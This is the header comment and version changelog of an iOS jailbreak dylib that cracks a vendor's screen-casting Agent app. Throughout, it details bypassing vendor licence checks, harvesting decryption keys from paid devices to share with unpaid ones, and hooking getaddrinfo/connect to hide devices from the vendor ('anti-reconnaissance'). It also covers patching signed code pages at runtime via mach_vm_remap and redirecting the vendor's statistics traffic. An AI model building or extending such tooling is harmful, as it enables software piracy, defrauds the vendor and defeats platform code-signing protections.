// bs_unlock.m —— 贝塔投屏 Agent 解锁 dylib (v5)
//
// 演进
// ----
// v1  constructor 里直接调 _dyld_* / ObjC → 加载期死锁
// v2  改为独立线程 + 延迟 2s；只做 mushroom_head 注入
// v3  新增「脚本加载闸门自愈看门狗」（2026-09-26 在 192.69.0.47 上实证）
// v4  新增「本地模块注入」—— 把服务器才下发的热更模块喂给产品的 onion 字典
// v4.1 修复 v4 的「只灌一次」缺陷：改为按 onion 字典对象指针变化重灌
// v5  ★ 新增「路线 A」：从 PC 中控主动拉取模块
//       - [v5~v6.1] 读 App 数据目录的 app.plist 拿中控 IP（设备端天然入口）
//       - [v6.2 起]  ★ 不再读 app.plist！改为内置 BS_HOST_DEF（公网模块服务端），
//                    bs_pull.conf 可用 host= 覆盖。理由见 BS_HOST_DEF 处注释：
//                    app.plist 的 ip 是**贝塔投屏 App 连电脑中控**用的（用户手填），
//                    跟本补丁的服务端地址是两回事，共用一个文件会互相踩。
//       - GET http://<pc>:8080/manifest.json
//       - 比对本地 /var/mobile/Media/bs_modules/ 的 md5
//       - 缺/过期 → GET /modules/<name> → 校验 → 写盘 → 重灌 onion 字典
//       ⇒ 从此**不再需要 SSH、不再需要 MatisuXCS(8182)** 即可分发模块
// v5.2 修复：dylib 必须 adhoc 签名（否则 AMFI GUARD kill）；bs_log 去 NSLog
//          （裸 pthread 上 NSLog 崩 objc_msgSend）
// v5.3 诊断探针：bs_log 逐 step 打点，精确定位到 step5 后的解析环节
// v5.4 ★ 根治崩溃：路线 A 全链路**纯 C 化**——只用 OS 原语，不碰 ObjC 运行时
//       - bs_read_pc_ip_c   纯 POSIX 读 app.plist，抠 <string>（v6.2 已废弃，见下）
//       - bs_parse_manifest_c 自写 JSON 扫描器（替代会崩的 NSJSONSerialization）
//       - bs_md5_file/bs_md5_hex 自实现 md5（纯 C，已用 Python 对照 hashlib 验证）
//       - bs_http_get_c     唯一保留的 ObjC 路径（NSURLSession，实测裸线程安全），
//                           出参是 malloc 的 C buffer，把 ObjC 面收到最小
//       - 注入改由 watchdog 线程按 g_need_inject 标志执行，puller 只置位
//       实测：JSON 解析崩溃点（NSJSONSerialization → 0x10 SIGSEGV）已消除
// v5.5 ★ 根治 bs_http_get_c 的 use-after-free（2026-09-26，.45 实测崩溃帧定位）
//       - 症状：Agent 点「启动服务」后 2~6s 内猝死；崩溃报告
//               #1 bs_unlock.dylib  bs_http_get_c +0x5f04
//               #0 libobjc.A.dylib  objc_msgSend（KERN_INVALID_ADDRESS at 0x10）
//       - 反汇编锁定 0x5f04 = `ldr x0,[byref+0x28]; bl objc_msgSend$length`，
//               即源码 `out.length`（__block NSData *out）
//       - 根因：**CI 编译没加 -fobjc-arc ⇒ MRR**，block 里 `out = d` 不 retain，
//               `d` 属于 NSURLSession 回调队列的 autorelease pool，出 block 即死。
//               （`done==YES` 仍崩，是 use-after-free 的铁证）
//       - 修法：回调线程内部**当场 memcpy 到 malloc buffer**，只把裸指针+长度
//               通过 calloc 的 slot 结构带回；ObjC 对象生命周期不出 block。
//
// v6.4 ★★ probe 模式（2026-09-28，真卡机只读雷达）
//       - 同一份 dylib，conf `mode=probe` 时切成「只读上报」：
//         不注入密钥 / 不起心跳 watchdog / 不 pull 模块 / 不打 Agent 补丁
//       - 周期读本地 beta.so 版本 + `_g_script_mushroom_head` 快照 →
//         POST /probe（"BSPR" 帧：密钥 + 包）→ 云端入库，供免卡密机自取
//       - ⇒ 真卡机升脚本后自动上架密钥，PC 侧哨兵可完全省掉
//       - 新增 bs_http_post_ex / bs_read_file / bs_hex3 / bs_mh_snapshot / bs_probe_thread
//
// v6.5 ★★ 版本跃迁自愈（2026-09-28，免卡密机「跟版不掉链」）
//       - 缺陷（v6.4 及以前）：bs_inject_mh 只在 bootstrap 调一次；App **运行中**
//         若官方把 beta.so 从 2.9.9 蹦到 3.0.0，_g_script_mushroom_head 里没有
//         新版本键 → `can not find version key!!` → 脚本挂，直到用户重开 App。
//         （官方下包是自动的：心跳 → find ver changed! → 147 块重下；
//           但下完后约 12s 就重新加载脚本，而 puller tick 默认 300s，来不及补键。）
//       - 做法：新增 bs_verwatch 轻量线程（默认 3s）——纯 C 读 beta.so 头 4B，
//         版本号一变就调 bs_inject_mh：向 /key 取该版本密钥 → **合并**进字典槽位。
//         ⇒ 3s 内补齐密钥，早于脚本重载，无需重开 App。
//       - bs_inject_mh 改为「按版本幂等」：槽位已含该版本键则快路径直接返回
//         （纯 C，不碰 ObjC）；否则合并注入。首次仍是 bootstrap 调一次。
//       - 新增 bs_verwatch / VERWATCH_TICK_SECS / g_mh_ver / bs_mh_has / bs_verhex_to_bytes
//
// v6.6 ★★ 主动跟版（2026-09-28，免卡密机不依赖官方通道也能拿到新 beta.so）
//       - 缺口：v6.5 只解决「密钥」，**包本体**仍依赖官方 server2 分块下发。
//         若官方通道不可达 / 不下发，盘上永远停在旧脚本。
//       - 做法：解锁模式新增 bs_so_sync 线程（默认 120s）——
//           GET /ver?prj=sjz            → 云端最新版本（只元数据，不吐正文）
//           比本地新 && 云端有该版本密钥  → GET /script/beta.so?ver=<新版本>
//           校验「体积下限 + 包头版本字节」→ 写 .sync.tmp → fsync → rename 原子落盘
//         ⇒ 落盘后 verwatch（3s）自动补密钥，与官方通道**互为备份**。
//       - 只升不降：云端版本 <= 本地一律不动（防回退）。
//       - 云端有包但密钥未上架 → 不拉（拉下来解不开），下轮再看。
//       - probe 模式**不启动**本线程（真卡机业务零改变这一条不变）。
//       - 新增 bs_so_sync_once / bs_so_sync_thread / bs_write_file_atomic /
//         bs_json_pick_ver / bs_json_has_true / SO_VER_PATH / g_so_sync / g_so_tick
//       - ⚠️ 落盘 ≠ 生效：脚本**不热加载**，仍要一次重开 App（或官方那一跳心跳带来的重载）。
//         本功能保证的是「包已在盘上」，不是「立刻在跑」。
//
// v6.7 ★★ 落盘后自动重启（2026-09-28，把「点运行」这一步也自动化）
//       - 缺口：v6.6 把包拉到盘上后，用户还得手动点一次中控「运行」才生效。
//       - 前提（产品硬约束，已实证）：_bb_load_script 闸门 —— g_lua_state != 0 时
//         点运行/发启动一律 **return -1、静默失败**。所以「重启」必须先把 state 清零。
//       - 做法（conf `autoreload=` 默认 1，写 0 关闭）：
//           so_sync 落盘成功后读 _g_bb_script_run：
//             run == 1 → 置 g_need_reload，交给 watchdog 执行重启
//             run == 0 → 只落盘（没在跑就没人需要新版本），打日志跳过
//           watchdog 小状态机（2s tick）：
//             STOP(_set_user_script_operate(1)) → 等 g_lua_state 归零
//             → START(operate(0)) → 等 run 变 1 → 收工
//             任一步超时（RL_ZERO_TICKS / RL_RUN_TICKS）→ 放弃 + 记日志，不重试
//       - ★★ 重启期间 g_reload_busy 屏蔽两条既有逻辑，否则互相打架：
//             ①「run 1→0 立刻抹模块」——不屏蔽的话每次自动重启都会清空 3 个 .lua，
//               脚本重启后 wait_call_func 拿不到模块 → 业务卡死。
//             ②「僵死自愈（st!=0 && run==0 连续 10s → STOP）」——不屏蔽会补发 STOP。
//       - probe 模式不启用；so_sync 只在版本**真的变化**时才落盘 ⇒ 每个新版本最多重启一次。
//       - 新增 OPER_START / g_autoreload / g_need_reload / g_reload_busy / RL_* 常量
//
// v6.8 ★★ 下载长超时 + 重载键对齐（2026-09-28，两台外网弱网机 + .45 实测事故驱动）
//       - ① 弱网下载超时：A(111.172.226.88)/B(111.172.194.181) 日志实锤 ——
//         beta.so 下载共用 PULL_TIMEOUT=6s（resource 8s），弱网 8s 拉不完 1.16MB
//         → NSURLErrorTimedOut(-1001) → 0 字节 → bad size 0 abort，每 120s 白拉一次
//         （A 38 次 / B 9 次），服务端还以为发完了。修法：拆 bs_http_get_ex_tmo，
//         beta.so 下载专用 SO_DL_TMO_REQ=60（空闲）/ SO_DL_TMO_RES=300（总预算），
//         信号量等待跟随 resource；小请求仍 6s/8s。
//       - ② 重载键对齐：.45 实测 START(19:08:36) 早于 verwatch 键注入(19:08:56)
//         → 脚本拿旧键解新包 → 解密失败 → 16s abort reload。修法：so_sync 置位时
//         记 g_rl_ver=目标版本；watchdog 在 state 归零后、START 前等
//         g_mh_ver==g_rl_ver（RL_KEY_TICKS=30*2s=60s，容纳 verwatch 缺键 30s 节流），
//         超时放弃不重试。
//
// v6.9 ★★ 局域网中继分流（2026-09-28，跨境链路 ~50KB/s 实测驱动）：
//       云端回环自测 278MB/s、本机→云端仅 41-53KB/s ⇒ 瓶颈是跨境链路不是服务器；
//       批量设备同时拉包会互相挤占。方案：中控 PC 跑轻量中继 bs_relay.py（只管
//       beta.so 的下发/上传），设备侧新增 conf 键 sohost=/soport= —— 仅 beta.so
//       下载走中继（局域网毫秒级），/hb /key /ver /probe /modules 仍直连云端。
//       中继挂掉只影响「有没有更新」，不影响心跳与模块注入。缺省不填 = 行为同 v6.8。
//
// v6.10 ★★ 设备信息自动上报（2026-09-28，云端设备表增强）：
//       /hb（与 /manifest）query 追加 &nm=<设备名>&md=<型号>&ov=<系统版本>：
//         nm = kern.hostname（如 8112）  md = hw.machine（如 iPhone13,2）
//         ov = kern.osproductversion（如 15.8）
//       纯 C sysctl + 百分号编码（设备名可能是中文/空格）。服务端解析入库
//       并在设备表展示（缺失显示 —）。g_qbuf 160→512、hb/manifest URL 缓冲 512→768。
//
// v6.11 ★★ 中控 IP 自动上报（2026-09-28，用户要求）：
//       读 app.plist（DATA_DIR/app.plist）的 ip —— 那是 App 连电脑中控的地址，
//       用户手填。v6.2 起我们不拿它当服务端地址（避免互踩），但作为**上报数据**
//       毫无冲突：/hb 追加 &pc=<中控IP>，云端设备表「中控IP」列自动填充
//       （手动备注优先）。纯 C 读 plist 抠 <key>ip</key> 后的 <string>。
//
// v6.12 ★★ 中继地址 = app.plist 的中控 ip（2026-09-28，用户拍板「不是回退，就是读它」）：
//       中控 PC 即中继 PC（同一台机器跑 BBCenter + BSModuleServer.exe）——
//       用户在 App 里填好中控 IP，beta.so 下载自动走 http://中控ip:soport(默认27391)。
//       conf 的 sohost 降级为应急覆盖（正常部署不填）；app.plist 缺失/为空 → 直连云端。
//       ★ 保险：中继拉包失败（PC 没跑 exe / 不在线）→ 自动回退直连云端拉一次。
//
// v6.13 ★ 中继地址每次下载现读 app.plist（2026-09-28，用户要求）：
//       不再用 conf 加载时缓存的 g_appip——用户中途改了中控 IP，下一轮下载就用新值。
//       g_appip 仅保留给 [conf] 日志展示。
//
// v6.14 ★★★ 密钥被产品或冲掉后自愈（2026-09-29，.45 现场事故根因）：
//       症状：`agent.log` = `begin load script` → `can not find version key!!`
//             → `load snail module failed`，中控点「运行」报「加载运行库出错」；
//             重开 App 能好一阵，然后复发。
//       根因：产品的 `_set_script_mushroom_head`(0x464c) 是**整表替换**——反汇编实证
//             `ldr x0,[x8,#0x20]` / `str x19,[x8,#0x20]` / release(old)，没有任何合并。
//             免卡密机拿不到官方密钥回包（`recv rep key failed` 反复出现），产品
//             依然会按自己的流程重设该字典 → 我们注入的键整个被冲掉。
//             而 v6.5~v6.13 的快路径是「**版本号相同就直接 return**」（先比版本、后查键），
//             于是 verwatch 每 3s 跑一次也永远修不回来 —— 这就是官方文档里那句
//             「必须人工重开 App（dylib 才会重新注入）」的真正原因。
//       修法：① 判据反转 —— **先查键在不在字典里**，不在就补（版本相同也补）；
//             ② 同版本密钥**缓存**在进程内存（g_mh_kk/g_mh_vv），补回时**不发 HTTP**，
//                纯本地合并（微秒级，哨兵 3s 一轮可无限次安全重放）；
//             ③ 补回时打 `[mh] key <ver> missing in dict (n=?) -> re-inject from cache`
//                —— 现场一眼可见「是不是被冲掉了」。
//
// v6.15 ★★★★★ beta.so 是**多记录混合版本**容器 ⇒ 必须注「两把」键（2026-09-29，`.45` 终局定论）：
//       症状：盘上 beta.so 明明是新版（030001）、字典里也确有 030001 且查得中，
//             加载却仍 `can not find version key!!`。
//       实测（探针抓帧）：Agent 在 `_bb_load_snail_module` 里逐条记录查密钥，
//             查的是 **020909**，不是文件头的 030001：
//               [lookup] key=020909 found=False caller=Agent+0xbe44 → [LOAD_ret] 0xffffffff
//       反解容器（`_res/beta.so` 等三份逐字节对照）：
//             每条记录 = [type 1B][ver 3B][hash 32B][未压缩长度 4B LE][压缩长度 4B LE] + zlib
//               记录0 type=0x00 元数据（解出来就是 json/sjz/player.json）→ ver = **项目版本**
//               记录1 type=0x01 脚本载荷                         → ver **恒为 020909**
//             ★ 2.9.9 / 3.0.0 / 3.0.1 三份文件的载荷记录**版本号与 32B hash 完全相同**
//               ⇒ 020909 是厂商固定的「载荷/容器格式版本」，与项目版本无关。
//       因果：v6.3~v6.14 只按**文件头**取一把键（`[mh] ver changed -> 030001`）
//             ⇒ 元数据记录有键 ✅、载荷记录 020909 **无键** ❌ ⇒ 加载失败。
//             昨天能用只因盘上还是 2.9.9（两条记录都是 020909，单键全覆盖）。
//             盘上之所以变成 3.0.x：设备侧 `bs_so_sync`(sosync=1 只升不降) 从云端自己拉的，
//             **不是人为改动**。
//       修法：新增 `bs_ensure_payload_key()` —— 独立于头版本，确保 `020909` 这把键也在字典里：
//             ① 字典已有 → 直接返回（零开销）
//             ② 否则 `GET /key?prj=&ver=020909` → 回包 35B 且首 3 字节 == 020909 才采用
//                （**云端可取 ⇒ 不必重编译即可换载荷版本**）
//             ③ 取不到 → 用编译期内置 `kKey/kVal`（已验证与线上 020909 逐字节一致）
//             ④ 取到的载荷键**缓存进进程内存**（g_pay_vv/g_pay_cached）⇒ 被冲掉时离线秒补
//             bootstrap 与 verwatch 各调一次（紧跟 bs_inject_mh 之后）。
//
// v6.16 ★ 模块服务端整体迁移（2026-10-01，用户指令）：
//       老云 47.243.156.129 弃用（数据已全量搬走），新云 = **47.116.161.226**（Docker 部署，
//       容器 bsmod，python:3.12-slim，/opt/bsmod 挂载，端口仍 47391）。
//       仅改 BS_HOST_DEF 内置默认值；bs_pull.conf 的 host= 覆盖逻辑不变。
//       配套：deb postinst 的 PCIP 默认值同步改（build_allinone_deb.py）。
//
// v6.17 ★★★★★ func-nil 崩溃自动恢复（脚本看门狗升级，2026-10-01）：
//       症状（.45 实测）：脚本连续跑 4~5h 后，agent.log 打
//             `run script error:[string "UNKONW = 0 ..."]:1: attempt to call local 'func' (a nil value)!`
//             → agent stop script。09-26 与 10-01 两次同签名，10-01 那次卡在
//             夜间休息(0~7点)醒来后 2 秒。
//       根因（胶水脚本 + bb_common.lua 双份同逻辑，反解实锤）：
//             wait_call_func 内置自刷新定时器 g_wait_call_interval = 4~5h 随机，
//             到点执行 `load(name.."=nil")()` 把模块全局函数抹成 nil（厂商热更新设计），
//             靠 Agent 原生 waitCallModule(name) 重载恢复；
//             但重载路径 `func = load("return "..name)()` 拿回 nil（waitCallModule 未真正
//             重执行模块文件）→ `return func(...)` 崩。夜间长睡使定时器在静默期到点，
//             醒后连续两次调同一模块必踩 → 「跑久了必崩」的元凶。
//       修法（watchdog 新增 crash-resume 分支，conf `crashresume=` 默认 1）：
//             ① 每 tick 对 agent.log 做增量扫描（记 size 基线，首轮只记不扫）；
//             ② 新增字节命中签名 `attempt to call local 'func' (a nil value)` 且
//                脚本已停稳(run=0 st=0 saw_run=1)且非 reload_busy 且心跳在授权(g_hb_ok=1)
//                → 发 OPER_START 自动拉起（等价中控再点一次运行）；
//             ③ 冷却 CR_COOLDOWN=300s，防止异常场景连拉；
//             ④ 日志轮转（size 变小）只重置基线不扫描，避免旧签名误触发。
//       不自动拉起的情形（自然排除）：中控主动点停 / killswitch（403 拒绝）/ 心跳失联
//             —— 这些路径的 agent.log 都不含 func-nil 签名。
//       ★ v6.24b 补漏（2026-10-17 .115 实锤）：v6.24a 只在「新增字节命中签名」时
//             动作，OPER_START 后脚本若二次崩溃（bb_common 仍 nil）不再产生新签名
//             → 永久躺平（16:16 崩，停到 17:09+ 未恢复）。改为「崩溃检出 → pending
//             状态机 → 60s 起递增至 600s 封顶无限重试」，直到 run=1 或条件不满足。
//             因为只在真实崩溃签名命中时置位，休眠静默不会误触发（不复活 v6.23z
//             的静默看门狗）。特征串 "[cr] retry #" / "[cr] recovery OK"。
//
// v6.18 ★★★★★ 多版本键注入 + 跟版键闸门（2026-10-01，3.0.5 实战驱动）：
//       症状（.45 实测）：beta.so 030001→030005 跟版后，每次 run script 都
//             `can not find version key!!` → `load snail module failed` → agent stop script。
//       根因（beta_so_parse.py 解 3.0.5 实锤）：3.0.5 段流**混用多版本键** ——
//             18 个 lua 记录各自带版本 030002/030003/030004/030005（厂商混段兼容旧逻辑），
//             PNG 记录仍 020909。而 v6.15 注键模型 = 头版本键 + 020909 载荷键两把，
//             字典里永远缺 030002~4 → 逐记录查键必炸。2.9.9~3.0.1 没炸只因
//             当时全部 lua 记录与头同版本，两把键恰好全覆盖。
//       修法（两处，互相配套）：
//             ① verwatch 每 tick 增加一步：扫盘上 beta.so 的**全部段头版本**
//                （按厂商容器格式游走：type0=44B 头+csz、type1=46B 头+align16(ci)、
//                type2=42B 头+align16(nl+cl)；异常即停，只取已扫到的），对每个版本
//                走「字典有？→ 云端 /key → 合并注入」的 ensure 流程（带 per-ver 节流）。
//                扫描结果按 (size,mtime) 缓存，文件没变不重扫。
//             ② so_sync 落盘前加**键闸门**：下载的新包先扫版本，逐版本确保键到手
//                （云端取到即顺手注入预热），任何一把取不到 → 不落盘、保持旧包，
//                等 sotick 下一轮重试。杜绝「包切了键没到」的断档窗口。
//                扫描失败（0 个版本，格式异常）→ 保守放行走老逻辑并打警告。
//
// v6.19 ★★★ 厂商服务器进程内屏蔽（2026-10-01，用户指令：假卡反侦察）：
//       目标：假卡机完全切断厂商二进制层的 vps.beibeiplay.com（43.154.19.236，
//             Agent 启动时 TCP 一次 + UDP 7891 探测）—— 厂商侧看不到这台设备。
//       影响面实证：解锁/密钥/跟版/模块全走我们云端（47.116.161.226，裸 IP），
//             中控走 app.plist 的 PC IP，脚本层 60.204.159.47 是裸 IP——
//             三者均不依赖该域名，屏蔽零影响（真卡机 probe 模式不装钩子，
//             卡密心跳不受影响）。
//       实现（fishhook，仅 unlock 模式安装）：
//             ① getaddrinfo("vps.beibeiplay.com") -> EAI_NONAME（域名解析掐断）
//             ② connect(sin_addr==43.154.19.236) -> -1 EHOSTUNREACH（兜底硬编码 IP）
//             ③ constructor 起独立线程**尽早安装**（赶在 Agent 首次外联前），
//               自行快扫 conf 的 mode=/blockvps=（不依赖 bootstrap 的 2s sleep）
//             ④ conf 新键 `blockvps=`（缺省 1 = 屏蔽；写 0 关闭）
//       日志：[blk] 前缀，前 5 条全打 + 之后每 60 条采样，防刷屏。
//       已知边界：fishhook 只能重绑**调用方镜像**的符号表 —— 若厂商经
//             CFNetwork（共享缓存内部）外联则拦不住；实测观察 [blk] 计数，
//             若始终为 0 且厂商流量仍在，退回路由器防火墙方案。
//
// v6.20 ★★★ 自有卡密系统接入（2026-10-02，CardVault v2 @ 47.116.161.226:18095）：
//       背景：Agent 5 点补丁=绕厂商验证（2038 恒过），但设备分发需要**自己的**
//             卡密管理。复用厂商输入通道：中控右键输入激活码 → card_sync →
//             Agent 内存全局变量 g_agent_activate_card（已实证不落盘）。
//       实现（仅 unlock 模式，conf cardcheck= 缺省 1）：
//             ① dlsym 解析 get_agent_activate_card / get_agent_auth_state
//               （回退：直接读 g_agent_activate_card 缓冲区），cardwatch 线程
//               3s 轮询卡密变化
//             ② 新卡密 → POST /api/client/login（X-Card-Key=app_key，
//               device_id=硬件序列号 hw.serial，回退 token）→ code=0 绑定/续期
//               成功；业务码 1~5 = 未激活/冻结/过期/绑他机 → 封禁
//             ③ 心跳：每 cardtick(300s) 重发 login 刷新在线状态与到期
//             ④ 宽限：网络失败不清判决，超过 cardgrace(72h) 无成功校验才封；
//               判决缓存落盘 DATA_DIR/bs_card.txt（冷启动即判）
//             ⑤ 封禁动作：OPER_STOP + 拒绝模块注入 + 拒绝 puller 拉模块 +
//               拒绝 crash-resume（**不抹 beta.so/不清模块文件**——可逆，
//               续卡后自动恢复）；恢复时打 [card] re-authorized
//       conf 新键：cardcheck=（缺省 1）、cardgrace=（小时，缺省 72）、
//             cardtick=（秒，缺省 120）、cardkey=、cardhost=（缺省内置）
//       日志：[card] 前缀。
//       业务码对照（CardVault v2）：0 ok / 1 不存在 / 2 冻结 / 3 过期 /
//             4 次数用完 / 5 绑定其他设备 / 401 应用未授权。
//       ⚠️ 该应用只用时长卡，禁用次数卡（login 心跳会扣次数）。
//
// v6.21 ★★★ 卡密捕获三通道 + interpose 强化（2026-10-02）：
//       背景（.45 实测 22:21）：中控输卡 → Agent「begin process activate card!」
//             打出卡号 → _bb_run_auth 连厂商验卡 →「卡密不存在！」→
//             **厂商验卡失败不写 g_agent_activate_card** → cardwatch getter
//             永远读空 → CardVault 激活链路断。且 [blk] 计数=0：_bb_run_auth
//             的 connect 走共享缓存内部调用，fishhook 拦不住（边界实锤）。
//       修复：
//             ① agent.log 捕获（主通道）：cardwatch 增量 tail agent.log，
//               解析「begin process activate card!」下一行卡号（8~40 位大写
//               数字母校验）→ 直接送 CardVault login。保留中控输卡 UX，
//               「卡密不存在」弹窗无害可无视。
//             ② conf `cardval=`（兜底通道）：getter/log 均无卡时用 conf 卡值
//               激活 —— 新设备预写 conf 开机即活，不依赖输卡动作。
//             ③ dyld interpose 兜底（connect/getaddrinfo）：__DATA,__interpose
//               对**全进程所有调用点**生效（含共享缓存回呼），与 fishhook
//               并存；orig 指针 fishhook 填充失败时 dlsym(RTLD_NEXT) 补。
//       日志：[card] captured from agent.log / [blk] 计数应开始增长。
//       卡源优先级：Agent 内存 getter > agent.log 捕获 > conf cardval。
//
// v6.22 ★ 中控授权到期时间与卡密一致（2026-10-03）：
//       背景：假卡 5 点补丁把 set_agent_auth_valid_time 改成硬编码
//             `mov x19,#0x7fff0000`（str w19 → 2038-01-19）→ 中控恒显 2038，
//             与 CardVault 真实到期对不上，容易看错。
//       反汇编实证：g_agent_auth_valid_time = int32 epoch @ 0x1000530c0，
//             **全二进制唯一写点就是那个 setter** → 直接写全局无覆写风险。
//       实现：cardwatch 每 tick 调 bs_sync_vendor_expire()——dlsym 拿
//             g_agent_auth_valid_time，g_card_expire>0 且值不同才写
//             （写前读比对，日志打 old->new）；login OK 后也即时同步一次。
//       效果：中控「授权到期时间」= 卡密真实到期；卡过期时厂商状态机
//             （valid_time<now 判定）也会自然翻过期，显示与行为一致。
//
// v6.23 ★ setter 中和：显示彻底稳定（2026-10-03，.45 实测驱动）：
//       实测：v6.22 同步生效但每 3~15s 被改回 0x7FFF0000 —— 厂商认证
//             状态机 _bb_RPFBXL3V9G / _bb_ZXBDWUMM1Y 周期性调
//             set_agent_auth_valid_time（补丁版恒写 2038）→ 显示抖动。
//       修复：cardwatch 启动时运行时补丁 —— setter 入口(+0xd94c)写 ARM64
//             `ret`（0xd65f03c0），厂商调用变空操作；valid_time 只剩
//             cardwatch 一个写者，显示恒定。mprotect+icache 失效齐全。
//       边界：仅 unlock 模式执行（probe 真卡机不动厂商代码）。
//
// v6.23b ★ 补丁通道换 mach_vm_remap（2026-10-03，.45 实测 errno=13 驱动）：
//       实测：mprotect(__TEXT, RWX) 被内核拒（errno=13，iOS 代码签名强制
//             W^X，roothide 亦然）→ v6.23 首版补丁没打上，改回依旧。
//       修复：两步 remap —— mach_vm_allocate 临时页 → memcpy+改字 →
//             mach_vm_remap(VM_FLAGS_OVERWRITE) 整页覆盖文本页（ellekit
//             同款技术，不触碰 mprotect 对签名页的限制）→ icache 失效。
//
// v6.23e ★★ 卡密 code 解析 bug 修复（2026-10-03，冻结实测失效驱动）：
//       实测：后台冻结卡（status=2，服务端铁证返回 code=2），设备端心跳
//             4 拍连续 login OK —— 冻结/过期/绑定冲突完全拦不住。
//       根因：bs_card_parse 用 strtol(p+6) 取 code，p+6 指到 JSON 冒号，
//             strtol(":2") 无有效数字**恒返回 0** ⇒ 一切业务失败码都被
//             当成 0=成功（g_card_expire 无 expires_ts 保持旧值 + lastok
//             刷新 → 宽限判决永远通过）。
//       修复：先 strchr 找 ':' 再 strtol（与 expires_ts 解析对齐）。
//
// v6.23f ★★ 重启后心跳断流 → 缓存卡兜底（2026-10-03，拉黑实测失效驱动）：
//       实测：.45 拉黑后中控脚本一直跑。设备 16:31 重启后 5 小时零心跳日志。
//       根因：重启后厂商内存激活卡清空 + agent.log 截断（tail scan hit=no）
//             + conf cardval 未填 → 三卡源全空 have_card=0 → 心跳分支
//             （条件 have_card && g_card_cur[0]）永不执行 → 设备不再联系
//             卡密服务器；判决却用缓存 expire（2026-11-03）恒过 → 脱机永动。
//       修复：新增第④卡源 = 卡密缓存 g_card_cur（getter > 日志 > conf >
//             缓存），have_card=0 时用缓存卡继续心跳；服务端冻结/拉黑/
//             过期照常经心跳送达 → rc>0 清 expire/lastok → BLOCKED +
//             OPER_STOP；解冻/续费也照常自动恢复。一次性诊断行
//             "card source = cache fallback"。
//
// v6.23g ★ 网络宽限 72h→1h（2026-10-03 用户拍板）：断网 1 小时内可续命，
//          超过即封；conf cardgrace= 可覆盖。
//
// v6.23i ★★ BLOCKED 每拍 wipe（2026-10-03，删卡实测仍运行驱动）：
//       实测：.45 删卡后 login FAIL code=1 → BLOCKED + OPER_STOP + gates 全到位，
//             中控一点运行脚本照跑。根因：BLOCKED 只「拒绝新注入」，onion 字典里
//             封禁前注入的模块代码还在 —— 厂商脚本引擎直接拿旧代码执行。
//       修复：封禁期间每拍 ① 清空 onion 字典（removeAllObjects，isKindOfClass
//             防不可变字典异常）② unlink 本地模块 *.lua（复用 killswitch 逻辑，
//             抽成 bs_wipe_local_modules）。厂商/中控若重灌，下一拍再清。
//             恢复全自动：卡重新有效 → pull 重下模块 → wd 重注入。
//       语义（用户拍板）：无激活卡 / 激活后被删 / 冻结 / 拉黑 / 过期 / 绑他机
//             —— 一切 BLOCKED 态 = 删模块 + 停脚本。
//
// v6.23j ★ device_id 防 "unknown" 共享（2026-10-03，外网激活实测驱动）：
//       实测：某设备 hw.serial 返回字面量 "unknown"（非空）→ 旧写法直接采信，
//             绑定字段存 "unknown"；所有无序列号设备共享此 id ⇒ 绑定比对
//             unknown==unknown 恒过，一张卡可被多台设备共用（业务漏洞）。
//       修复："unknown" 视为无效 → 回退 g_token（postinst 每机唯一设备码）；
//             两者皆无才 "unknown"。bs_card_device_id 加日志便于远端定位。
//
// v6.23k ★ 设备日志回传（2026-10-03，外网设备排障无日志驱动）：
//       bs_unlock.log 尾部 ≤8KB 随 puller 每拍 POST /devlog?key=<token> 到云端；
//       云端存 devlogs/<token>.log，后台网页设备列表加「日志」按钮直接看。
//       无增长/50s 内不重发；失败静默，不影响主链路。
//
// v6.23l ★ 统计上报改道（2026-10-04，本地统计站落地驱动）：
//       conf 新键 statip=<IP>：connect 层把 60.204.159.47:7875(统计)/7880(照片)
//       改写到 statip（本地统计站）。不依赖 beta.so 版本/lua 变量名，厂商更新免疫；
//       放 g_blk_active 闸门之前，probe 配了 statip 同样生效；未配置零开销。
//       换统计服务器只改 conf 一行，无需重编 dylib。
//
// v6.23m ★ 改道目标默认跟 app.plist（2026-10-04，用户拍板「中控与统计网站都是
//       app.plist 那台电脑」）：statip 优先；未配置时每次 connect 现读
//       app.plist 的中控 ip（与 v6.13 中继同款逻辑）作改道目标，端口不变。
//       分发场景零配置——对方把 exe 放自己电脑、设备 app.plist 填他 IP，
//       统计自动落到他电脑，无需 conf 再填 statip。
//
// v6.24r ★★★ 可观测性补丁（2026-10-20，用户批准）：解决「落盘 ≠ 生效」无法远程判读
//       + 崩溃现场被高频流水冲掉。三件事，全部只观察、不自动运行脚本（铁律不动）：
//       ① 独立事件道 bs_evt.log：`[us]` / `[cr]` / `[so]` / `[wd]` 决策级事件双写
//          （主日志照旧 + 专道追加），并新增 `&src=evt` 上报通道随 puller 每拍回传。
//          动机：主日志被 `[pull] step1~5`、`recv rep key failed`(14s/次)、
//          `dns look up failed`(6.6s/次) 淹没，8KB 窗口只剩 6~12 分钟 —— 10-20
//          三台设备（e9643 / edf7 / a39cb6）崩停现场全在 10 分钟内被冲干净，
//          远程永远只能看到「停了」，看不到「为什么停」。事件道几十条/天，8KB 可存数周。
//       ② 运行库生效状态 `.bs_so_state`（md5/size/pend/applied）：落盘新 so 置 pend=1，
//          watchdog 观察到「run=1 且 sjz 新鲜」时清 pend=0。动机：v6.24q 删掉自动重载后，
//          换包瞬间正在跑的脚本仍用内存旧 so —— a39cb6 于 17:02 落盘 fix4、17:32 仍崩在
//          fix3 上，而远程完全看不出「盘上新的、内存旧的」。bootstrap：无状态文件时按
//          盘上 beta.so 的 md5 建基线（pend=0），保证全网每台都能被读到。
//       ③ `[cr] stall scan` 追加 `so=<md5前8> pend=<0|1> size=<n>`：一眼分清三种停摆
//          ——盘上是旧的坏包 / 盘上新包但还没重启脚本 / 新包已生效仍然停。
//
// v6.28 ★★★ [ar] 脚本自停自动恢复（2026-10-21，用户指令：判断中控下发过运行，
//       在没有主动停止的情况下，检测到脚本自己停了就再运行一次**；且明确不走中控方案）。
//       ★ 与 v6.24p/q 不矛盾：那两次删的是**无条件**自动拉起（假运行看门狗 / 崩溃即拉 /
//         空闲兜底），共同毛病是不区分「谁停的」。本版把「谁停的」作为第一判据，
//         并把授权态落盘（.bs_ar）—— 重启/装包后仍记得「这台本来就该跑」，
//         这正是「装完包必须手动点运行」的根因。
//       ① 新增授权态 armed（落盘 DATA_DIR/.bs_ar，字段 armed/att/last/next/gu/gts）：
//          置 1：run 0->1 且 sjz 新鲜（排除冷启残留）｜agent.log 尾部事件是运行；
//          置 0：中控/用户停止（stop 且近 4KB 无 recv auth failed）｜run 1->0 且 sjz 新鲜
//                ｜[kill] killswitch（新增 g_kill_sent，180s 内不落 .bs_userstop）。
